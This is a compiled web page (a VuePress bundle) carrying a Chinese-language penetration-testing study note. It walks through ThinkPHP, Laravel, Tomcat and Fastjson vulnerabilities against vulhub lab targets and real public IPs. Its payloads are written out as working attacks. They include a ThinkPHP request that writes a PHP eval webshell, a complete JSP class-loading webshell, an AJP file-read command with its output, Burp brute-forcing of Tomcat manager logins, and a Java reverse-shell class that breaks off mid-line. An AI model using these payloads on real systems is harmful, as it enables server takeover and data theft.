"use strict";(self.webpackChunkvuepress_theme_hope_template=self.webpackChunkvuepress_theme_hope_template||[]).push([[631],{81021:(s,i)=>{i.A=(s,i)=>{const a=s.__vccOpts||s;for(const[s,n]of i)a[s]=n;return a}},10781:(s,i,a)=>{a.r(i),a.d(i,{comp:()=>is,data:()=>as});var n=a(6254);const e=a.p+"assets/img/1-20240925234450-spicltx.54e84811.png",l=a.p+"assets/img/2-20240925234454-ycr5v59.9c1ed709.png",t=a.p+"assets/img/3-20240925234456-emdyntj.354e143a.png",p=a.p+"assets/img/4-20240925234459-hvjjsny.6f16cec5.png",h=a.p+"assets/img/image-20240920102826-ldfpg3p.0aada7c6.png",k=a.p+"assets/img/image-20240920102906-drpbfxr.9a2e902a.png",d=a.p+"assets/img/image-20240920103034-5rpgce1.3b6d94a4.png",r=a.p+"assets/img/image-20240920105017-nfsfzab.f2bbb9a7.png",g=a.p+"assets/img/image-20240920105003-lj3t9gy.26bed3c5.png",c=a.p+"assets/img/image-20240920105120-ytsmkyf.19ec6d10.png",o=a.p+"assets/img/image-20240920193307-evrlr91.bc9a9e77.png",A=a.p+"assets/img/image-20240920191710-jt2na28.4ff2e145.png",B=a.p+"assets/img/image-20240920191737-zrzls6m.fbbff5bb.png",y=a.p+"assets/img/image-20240920191852-zvr6bzu.f2aa0ff0.png",m=a.p+"assets/img/image-20240920193243-93and04.5c3708db.png",u=a.p+"assets/img/image-20240920204106-y9hu5hh.acbc383e.png",v=a.p+"assets/img/image-20240920205408-bfxduy2.e566e95c.png",b=a.p+"assets/img/image-20240920205528-rce1js1.d2071993.png",F=a.p+"assets/img/image-20240920210049-w9kh3x7.54a0c21e.png",C=a.p+"assets/img/image-20240920210354-eocnw7d.f214ece0.png",f=a.p+"assets/img/image-20240920210341-9552omw.f52b450b.png",x=a.p+"assets/img/image-20240920210327-3bedsdx.121198ad.png",E=a.p+"assets/img/image-20240920210443-0tn7w7d.a815170b.png",D=a.p+"assets/img/image-20240920210504-vt56g60.d6bedd18.png",j=a.p+"assets/img/image-20240920210610-0l9v0xn.7ad1d314.png",z=a.p+"assets/img/image-20240920210703-u82obqh.d29992b4.png",w=a.p+"assets/img/image-20240920203559-i3a3xt3.f0f6d3f1.png",T=a.p+"assets/img/image-20240920203414-wxx52do.1d929ec7.png",q=a.p+"assets/img/image-20240920203712-wrk8dww.0b937efd.png",P=a.p+"assets/img/image-20240920203834-rb8jfw2.a41dd2e5.png",S=a.p+"assets/img/fastJSON-20240922172500-3om8xvl.ee4b3d19.png",_=a.p+"assets/img/image-20240922174340-mvw33cz.6f22e13f.png",L=a.p+"assets/img/image-20240922175044-30z9clg.6b1c09ef.png",R=a.p+"assets/img/image-20240922175657-ab654i4.a25410ed.png",H=a.p+"assets/img/image-20240922180028-m8evnbw.63743650.png",I=a.p+"assets/img/image-20240922180349-k0anan1.95528449.png",M=a.p+"assets/img/image-20240922181424-uwibv6s.a22d278a.png",V=a.p+"assets/img/image-20240922184248-t5p3fq2.84748f1d.png",O=a.p+"assets/img/image-20240922184027-fyp8n3b.981a4b80.png",N=a.p+"assets/img/image-20240922223146-msynu4q.f920e4e9.png",U=a.p+"assets/img/image-20240923121050-86kd49q.93b1be5a.png",G=a.p+"assets/img/image-20240923121403-ovyhmgf.898c9468.png",W=a.p+"assets/img/image-20240923130449-0byba8l.81aa3645.png",J=a.p+"assets/img/image-20240923002101-ql62s85.6e74e768.png",$=a.p+"assets/img/image-20240923002122-sc000un.a902471a.png",Z=a.p+"assets/img/image-20240923002233-udo4u3m.97fa4455.png",K=a.p+"assets/img/image-20240923201103-r8ml6hs.0ad951ed.png",Y=a.p+"assets/img/image-20240923201153-5pivtsu.f3c4994f.png",X=a.p+"assets/img/image-20240923201307-ieoz0kh.e6ad02de.png",Q=a.p+"assets/img/image-20240923202034-xeso1bl.c1904112.png",ss={},is=(0,a(81021).A)(ss,[["render",function(s,i){return(0,n.uX)(),(0,n.CE)("div",null,i[0]||(i[0]=[(0,n.Fv)('<table><thead><tr><th>漏洞名称</th><th>漏洞原理</th><th></th></tr></thead><tbody><tr><td>ThinkPHP5.0.23 Remote Code Execution Vulnerability</td><td><span data-type="text" style="color:var(--b3-font-color8);">获取method的方法中没有正确处理方法名，</span>导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞。</td><td></td></tr><tr><td>Laravel CVE-2021-3129</td><td>当Laravel开启了Debug模式时，由于Laravel自带的Ignition 组件对file_get_contents()和file_put_contents()函数的不安全使用，攻击者可以通过发起恶意请求，构造恶意Log文件等方式触发Phar反序列化，最终造成远程代码执行。</td><td></td></tr></tbody></table><h2 id="thinkphp" tabindex="-1"><a class="header-anchor" href="#thinkphp"><span><a href="http://www.thinkphp.cn" title="官方网站" target="_blank" rel="noopener noreferrer">ThinkPHP</a></span></a></h2><h3 id="thinkphp5-5-0-23-remote-code-execution-vulnerability" tabindex="-1"><a class="header-anchor" href="#thinkphp5-5-0-23-remote-code-execution-vulnerability"><span>ThinkPHP5 5.0.23 Remote Code Execution Vulnerability</span></a></h3><p>其5.0.23以前的版本中，<span data-type="text" style="color:var(--b3-font-color8);">获取method的方法中没有正确处理方法名，</span>导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞。</p><p>访问页面</p><p>​<img src="'+e+'" alt="1" loading="lazy">​</p><p>修改为POST 路径写为?s=captcha,, 多次BP尝试失败<img src="'+l+'" alt="2" loading="lazy">​</p><p>改用Heckbar发包。</p><p>​<img src="'+t+'" alt="3" loading="lazy">​</p><p>修改shell为如下，写入shell文件。</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">_method</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">__construct</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&amp;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">filter[]</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">=system</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&amp;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">method</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">get</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&amp;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">server</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">REQUEST_METHOD</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">]</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">echo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;&lt;?php eval($_POST[cmd]) ?&gt;&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> &gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">shell.php</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>​<img src="'+p+'" alt="4" loading="lazy">​</p><h3 id="thinkphp-v5-0-20" tabindex="-1"><a class="header-anchor" href="#thinkphp-v5-0-20"><span><a href="http://www.thinkphp.cn" title="官方网站" target="_blank" rel="noopener noreferrer">ThinkPHP</a> V5.0.20</span></a></h3><p>Thinkphp_tools工具</p><p>​<img src="'+h+'" alt="image" loading="lazy">​</p><p>目标存在tp5_file_include漏洞, payload:</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> http://192.168.100.40:21939?s</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">=index/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">\\</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">think</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">\\</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">Lang/load</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&amp;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">file</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">/etc/passwd</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>​<img src="'+k+'" alt="image" loading="lazy">​</p><p>目标存在tp5_dbinfo_leak漏洞, payload:</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">http://192.168.100.40:21939?s</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">=index/think</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">\\</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">config/get</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&amp;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">name</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">database.hostname</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>hostname: 127.0.0.1, hostport: , database: , username: , password: root</p><p>​<img src="'+d+'" alt="image" loading="lazy">​</p><h2 id="laravel-cve-2021-3129-拉日尔沃" tabindex="-1"><a class="header-anchor" href="#laravel-cve-2021-3129-拉日尔沃"><span>Laravel CVE-2021-3129 拉日尔沃</span></a></h2><p>Laravel是一套简洁、优雅的PHP Web开发框架(PHP Web Framework)</p><p>漏洞概述</p><p>编号：CVE-2021-3129</p><p>当Laravel开启了Debug模式时，由于Laravel自带的Ignition 组件对file_get_contents()和file_put_contents()函数的不安全使用，攻击者可以通过发起恶意请求，构造恶意Log文件等方式触发Phar反序列化，最终造成远程代码执行。</p><p>​<img src="'+r+'" alt="image" loading="lazy">​</p><p>​<img src="'+g+'" alt="image" loading="lazy">​</p><p>​<img src="'+c+'" alt="image" loading="lazy">​</p><h2 id="tomcat" tabindex="-1"><a class="header-anchor" href="#tomcat"><span>tomcat</span></a></h2><p>docke里tomcat默认端口8080，映射时建议不要修改。86--&gt;8080</p><h3 id="cve-2017-12615" tabindex="-1"><a class="header-anchor" href="#cve-2017-12615"><span>CVE-2017-12615</span></a></h3><p>Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）</p><p>​<img src="'+o+'" alt="image" loading="lazy">​</p><div class="language-jsp line-numbers-mode" data-highlighter="shiki" data-ext="jsp" data-title="jsp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>&lt;%!</span></span>\n<span class="line"><span>    class U extends ClassLoader {</span></span>\n<span class="line"><span>        U(ClassLoader c) {</span></span>\n<span class="line"><span>            super(c);</span></span>\n<span class="line"><span>        }</span></span>\n<span class="line"><span>        public Class g(byte[] b) {</span></span>\n<span class="line"><span>            return super.defineClass(b, 0, b.length);</span></span>\n<span class="line"><span>        }</span></span>\n<span class="line"><span>    }</span></span>\n<span class="line"><span> </span></span>\n<span class="line"><span>    public byte[] base64Decode(String str) throws Exception {</span></span>\n<span class="line"><span>        try {</span></span>\n<span class="line"><span>            Class clazz = Class.forName(&quot;sun.misc.BASE64Decoder&quot;);</span></span>\n<span class="line"><span>            return (byte[]) clazz.getMethod(&quot;decodeBuffer&quot;, String.class).invoke(clazz.newInstance(), str);</span></span>\n<span class="line"><span>        } catch (Exception e) {</span></span>\n<span class="line"><span>            Class clazz = Class.forName(&quot;java.util.Base64&quot;);</span></span>\n<span class="line"><span>            Object decoder = clazz.getMethod(&quot;getDecoder&quot;).invoke(null);</span></span>\n<span class="line"><span>            return (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, String.class).invoke(decoder, str);</span></span>\n<span class="line"><span>        }</span></span>\n<span class="line"><span>    }</span></span>\n<span class="line"><span>%&gt;</span></span>\n<span class="line"><span>&lt;%</span></span>\n<span class="line"><span>    String cls = request.getParameter(&quot;passwd&quot;);</span></span>\n<span class="line"><span>    if (cls != null) {</span></span>\n<span class="line"><span>        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</span></span>\n<span class="line"><span>    }</span></span>\n<span class="line"><span>%&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>抓包获取到该tomcat的包，<span data-type="text" style="color:var(--b3-font-color9);">将GET改为PUT</span>，在请求体里写上shell。注意文件名格式、IP要写对：</p><p>linux: jsp/ winowds:jsp%20 jsp::$DATA</p><p>​<img src="'+A+'" alt="image" loading="lazy">​</p><p>访问成功，200。</p><p>​<img src="'+B+'" alt="image" loading="lazy">​</p><p>​<img src="'+y+'" alt="image" loading="lazy">​</p><h3 id="cve-2020-1938" tabindex="-1"><a class="header-anchor" href="#cve-2020-1938"><span>CVE-2020-1938</span></a></h3><p>Tomcat默认开启AJP服务（8009端口），存在一处文件包含缺陷。攻击者可以通过构造的恶意请求包来进行文件包含操作，从而读取或包含Tomcat上所有webapp目录下的任意文件，如：webapp配置文件或源代码等。</p><p>tomcat默认的conf/server.xml中配置了2个Connector，一个为8080的对外提供的HTTP协议端口，另外一个就是默认的8009 AJP协议端口，两个端口默认均监听在外网ip。</p><p>​<img src="'+m+'" alt="image" loading="lazy">​</p><div class="language-jsp line-numbers-mode" data-highlighter="shiki" data-ext="jsp" data-title="jsp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span></span></span>\n<span class="line"><span>C:\\Users\\Anonymous\\Desktop&gt;python2 CVE-2020-1938.py 47.113.187.190 -p 8009 -f /WEB-INF/web.xml</span></span>\n<span class="line"><span>Getting resource at ajp13://47.113.187.190:8009/asdf</span></span>\n<span class="line"><span>----------------------------</span></span>\n<span class="line"><span>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span>\n<span class="line"><span>&lt;!--</span></span>\n<span class="line"><span> Licensed to the Apache Software Foundation (ASF) under one or more</span></span>\n<span class="line"><span>  contributor license agreements.  See the NOTICE file distributed with</span></span>\n<span class="line"><span>  this work for additional information regarding copyright ownership.</span></span>\n<span class="line"><span>  The ASF licenses this file to You under the Apache License, Version 2.0</span></span>\n<span class="line"><span>  (the &quot;License&quot;); you may not use this file except in compliance with</span></span>\n<span class="line"><span>  the License.  You may obtain a copy of the License at</span></span>\n<span class="line"><span></span></span>\n<span class="line"><span>      http://www.apache.org/licenses/LICENSE-2.0</span></span>\n<span class="line"><span></span></span>\n<span class="line"><span>  Unless required by applicable law or agreed to in writing, software</span></span>\n<span class="line"><span>  distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span></span>\n<span class="line"><span>  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></span>\n<span class="line"><span>  See the License for the specific language governing permissions and</span></span>\n<span class="line"><span>  limitations under the License.</span></span>\n<span class="line"><span>--&gt;</span></span>\n<span class="line"><span>&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span>\n<span class="line"><span>  xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span>\n<span class="line"><span>  xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee</span></span>\n<span class="line"><span>                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span>\n<span class="line"><span>  version=&quot;4.0&quot;</span></span>\n<span class="line"><span>  metadata-complete=&quot;true&quot;&gt;</span></span>\n<span class="line"><span></span></span>\n<span class="line"><span>  &lt;display-name&gt;Welcome to Tomcat&lt;/display-name&gt;</span></span>\n<span class="line"><span>  &lt;description&gt;</span></span>\n<span class="line"><span>     Welcome to Tomcat</span></span>\n<span class="line"><span>  &lt;/description&gt;</span></span>\n<span class="line"><span></span></span>\n<span class="line"><span>&lt;/web-app&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="tomcat8远程部署漏洞" tabindex="-1"><a class="header-anchor" href="#tomcat8远程部署漏洞"><span>tomcat8远程部署漏洞</span></a></h3><p>Tomcat manager登录界面存在弱口令漏洞，登录成功后有上传点，压缩包xxx.war的.war不会被解析，直接访问xxx/里面的一句话路径，可直接拿到shell</p><p>​<img src="'+u+'" alt="image" loading="lazy">​</p><ol><li><p>访问tomcat Mannger App ，密码是弱口令<span data-type="text" style="color:var(--b3-font-color9);">tomcat/tomcat</span>进入，不是需要爆破密码。</p><p>但，咱学习下如何爆破，输入密码抓包</p><p>​<img src="'+v+'" alt="image" loading="lazy">​</p><p>使用 Intruder 模块添加变量，选择爆破方式。</p><p>​<img src="'+b+'" alt="image" loading="lazy">​</p><p>Payload 选择 <code>Custom iterator</code>​</p><p>​<img src="'+F+'" alt="image" loading="lazy">​</p><p>3段拼凑，设置 Payload 1 的值为 <code>tomcat</code>​，即用户名。</p><p>​<img src="'+C+'" alt="image" loading="lazy">​</p><p>设置 Payload 2 的值为 <code>:</code>​，即分隔符。</p><p>​<img src="'+f+'" alt="image" loading="lazy">​</p><p>设置 Payload 3 的值为需要爆破的密码。咱添加几个做测试。</p><p>​<img src="'+x+'" alt="image" loading="lazy">​</p><p>添加 Payload Processing，选择为 Base64 编码。</p><p>​<img src="'+E+'" alt="image" loading="lazy">​</p><p>取消勾选 URL 编码。</p><p>​<img src="'+D+'" alt="image" loading="lazy">​</p><p>开始爆破。</p><p>​<img src="'+j+'" alt="image" loading="lazy">​</p><p>将返回状态<code>200</code>​的 Payload 解码，得到密码。</p><p>​<img src="'+z+'" alt="image" loading="lazy">​</p><p>成功登录后，在 Manager 页面上传 war 包即可直接 getshell 。</p></li><li><p>找到上传点，上传带有一句话jsp文件的名为xxx.war的包。</p><p>1.java环境配置</p><p>2.创建包含shell的jsp war</p><p>​<img src="'+w+'" alt="image" loading="lazy">​</p><p>3.上传文件</p><p>​<img src="'+T+'" alt="image" loading="lazy">​</p></li><li><p>访问 攻击ip地址/xxx/jsp文件路径，再用webshell连接工具进行连接。</p><p>查看是否上传成功</p><p>​<img src="'+q+'" alt="image" loading="lazy">​</p><p>连接Ant</p><p>​<img src="'+P+'" alt="image" loading="lazy">​</p></li></ol><h2 id="fastjson" tabindex="-1"><a class="header-anchor" href="#fastjson"><span>fastjson</span></a></h2><p>一个java库，将java对象转换为json类型字符串。</p><h3 id="fastjson反序列化漏洞" tabindex="-1"><a class="header-anchor" href="#fastjson反序列化漏洞"><span>Fastjson反序列化漏洞</span></a></h3><h4 id="利用流程" tabindex="-1"><a class="header-anchor" href="#利用流程"><span>利用流程</span></a></h4><ol><li>首先开启HTTP服务器，并将恶意类放在目录下</li><li>开启恶意RMI服务器</li><li>攻击者<span data-type="text" style="color:var(--b3-font-color9);">控制URL参数</span>为上一步开启的恶意<span data-type="text" style="color:var(--b3-font-color9);">RMI服务器地址</span></li><li>恶意RMl服务器返回ReferenceWrapper类</li><li>目标(JNDI Client)在执行lookup操作的时候，在decodeObjecti中将ReferenceWrapper变成Reference类，然后远程加载并实例化我们的Factory类(即远程加载我们HTTP服务器上的恶意类)，在<span data-type="text" style="color:var(--b3-font-color9);">实例化</span>时触发静态代码片段中的恶意代码.</li></ol><p>​<img src="'+S+'" alt="fastJSON" loading="lazy">​</p><h4 id="实验环境" tabindex="-1"><a class="header-anchor" href="#实验环境"><span>实验环境</span></a></h4><p>靶场vulhub：47.113.187.190:8090 centos7 docker-compose</p><p>rmi服务器：111.67.195.253:9000 centos7 jdk1.8.0_151</p><p>恶意站点：47.113.187.190:90 httpf服务</p><p>环境最少需要三方：1.攻击方(burpsuite抓包攻击) 2.提供服务方http and rmi 4.被攻击方 靶场 vulhub</p><h4 id="具体步骤" tabindex="-1"><a class="header-anchor" href="#具体步骤"><span>具体步骤</span></a></h4><ol><li><h5 id="linux-centos7-java环境配置" tabindex="-1"><a class="header-anchor" href="#linux-centos7-java环境配置"><span>Linux centos7 java环境配置</span></a></h5><p>1.1 jdk安装 华为源下载 <a href="https://repo.huaweicloud.com/java/jdk/" target="_blank" rel="noopener noreferrer">repo.huaweicloud.com/java/jdk/</a> jdk1.8.0_151</p><p>将压缩包下载到 /usr/local/java 里解压 tar -zvxf<br><img src="'+_+'" alt="image" loading="lazy">​</p><p>1.2 配置环境变量</p><p>vi /etc/profile 在这个文件里添加配置如下，注意路径对应，保存。</p><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;">JAVA_HOME</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">usr</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">local</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">java</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">jdk1.8.0_151</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;">PATH</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">$</span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;">JAVA_HOME</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">bin</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">$</span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;">PATH</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;">CLASSPATH</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.:</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">$</span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;">JAVA_HOME</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">jre</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">lib</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">ext:</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">$</span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;">JAVA_HOME</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">lib</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">tools.jar</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">export </span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;">PATH</span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;"> JAVA_HOME</span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;"> CLASSPATH</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>1.3 执行以下命令重新加载配置文件。</p><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">source </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">etc</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">profile</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>1.4 检验配置是否生效 java -version</p><p>​<img src="'+L+'" alt="image" loading="lazy">​</p><p><span data-type="text" style="color:var(--b3-font-color9);">1.5 坑： java -version 总是报错，但配置又没有问题，直接重新下载jdk重新来一遍。。。。</span></p></li><li><h5 id="创建恶意类" tabindex="-1"><a class="header-anchor" href="#创建恶意类"><span>创建恶意类</span></a></h5><p>2.1 GetShell.java 注意修改ip和端口为接收反弹shell的主机及端口。</p><p><span data-type="text" style="color:var(--b3-font-color9);">坑：文件里public class GetShell的类名应该与文件名一致。否则编译时候会报错。</span></p><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> java.io.BufferedReader; </span></span>\n<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> java.io.InputStream; </span></span>\n<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> java.io.InputStreamReader;</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> public </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">class</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> GetShell1{ </span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">public </span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">GetShell1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">() throws </span><span style="--shiki-light:#0184BC;--shiki-dark:#ABB2BF;">Exception</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> { </span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Process p = Runtime.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">getRuntime</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">().</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">exec</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(new String[]{</span></span>\n<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;/bin/bash&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;-c&quot;</span><span 